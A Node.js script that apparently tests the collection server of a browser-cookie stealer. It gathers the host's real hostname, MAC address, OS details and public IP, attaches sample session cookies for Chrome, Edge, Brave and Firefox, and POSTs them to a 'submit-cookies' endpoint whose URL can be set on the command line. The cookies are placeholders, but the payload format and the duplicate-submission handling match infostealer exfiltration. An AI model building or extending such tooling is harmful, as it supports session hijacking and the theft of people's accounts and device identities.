#!/usr/bin/env node

/**
 * Test script to submit sample cookie data to the API
 * Run with: node test-submission.js
 */

const os = require('os');
const { networkInterfaces } = require('os');

// Get MAC address
function getMacAddress() {
  const nets = networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && !net.internal && net.mac !== '00:00:00:00:00:00') {
        return net.mac;
      }
    }
  }
  return '00:00:00:00:00:00';
}

// Get device info
function getDeviceInfo() {
  return {
    os_system: os.platform(),
    os_release: os.release(),
    os_version: os.version(),
    architecture: os.arch(),
    hostname: os.hostname(),
    mac_address: getMacAddress(),
    processor: os.cpus()[0]?.model || 'Unknown'
  };
}

// Sample cookie data
const sampleCookies = {
  chrome: [
    {
      name: 'session_token',
      value: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
      domain: '.google.com',
      path: '/',
      expires: '2024-12-31T23:59:59Z',
      secure: true,
      http_only: true
    },
    {
      name: 'user_id',
      value: '12345',
      domain: '.facebook.com',
      path: '/',
      secure: true,
      http_only: false
    }
  ],
  edge: [
    {
      name: 'microsoft_token',
      value: 'abcd1234efgh5678',
      domain: '.microsoft.com',
      path: '/',
      expires: '2024-12-31T23:59:59Z',
      secure: true,
      http_only: true
    }
  ],
  brave: [
    {
      name: 'brave_rewards',
      value: 'rewards_token_123',
      domain: '.brave.com',
      path: '/',
      secure: true,
      http_only: false
    }
  ],
  firefox: [
    {
      name: 'mozilla_session',
      value: 'firefox_session_xyz',
      domain: '.mozilla.org',
      path: '/',
      expires: '2024-12-31T23:59:59Z',
      secure: true,
      http_only: true
    }
  ]
};

// Get public IP
async function getPublicIp() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return '0.0.0.0';
  }
}

// Submit cookies
async function submitCookies() {
  console.log('🍪 Cookie Submission Test\n');
  console.log('Gathering device information...');
  
  const deviceInfo = getDeviceInfo();
  const publicIp = await getPublicIp();
  
  console.log(`Device: ${deviceInfo.hostname}`);
  console.log(`OS: ${deviceInfo.os_system} ${deviceInfo.os_release}`);
  console.log(`MAC: ${deviceInfo.mac_address}`);
  console.log(`Public IP: ${publicIp}\n`);

  const payload = {
    timestamp: new Date().toISOString(),
    public_ip: publicIp,
    device_info: deviceInfo,
    cookies: sampleCookies
  };

  // Allow custom API URL via command line
  const apiUrl = process.argv[2] || 'http://localhost:3001/api/submit-cookies';

  console.log(`Submitting to: ${apiUrl}\n`);

  try {
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    const result = await response.json();

    if (response.ok) {
      if (result.isDuplicate) {
        console.log('⚠️  Duplicate submission detected - skipped');
      } else {
        console.log('✅ Success! Cookie data submitted');
        console.log(`📝 Submission ID: ${result.id}`);
      }
      
      // Show cookie counts
      const counts = {
        chrome: sampleCookies.chrome.length,
        edge: sampleCookies.edge.length,
        brave: sampleCookies.brave.length,
        firefox: sampleCookies.firefox.length
      };
      const total = Object.values(counts).reduce((a, b) => a + b, 0);
      
      console.log('\n📊 Cookie Counts:');
      console.log(`   Chrome:  ${counts.chrome}`);
      console.log(`   Edge:    ${counts.edge}`);
      console.log(`   Brave:   ${counts.brave}`);
      console.log(`   Firefox: ${counts.firefox}`);
      console.log(`   Total:   ${total}`);
    } else {
      console.log('❌ Failed to submit cookies');
      console.log(`Status: ${response.status} ${response.statusText}`);
      console.log(`Error: ${result.error || 'Unknown error'}`);
    }
  } catch (error) {
    console.log('❌ Error submitting cookies');
    console.log(`Error: ${error.message}`);
  }
}

// Run the test
submitCookies().catch(console.error);
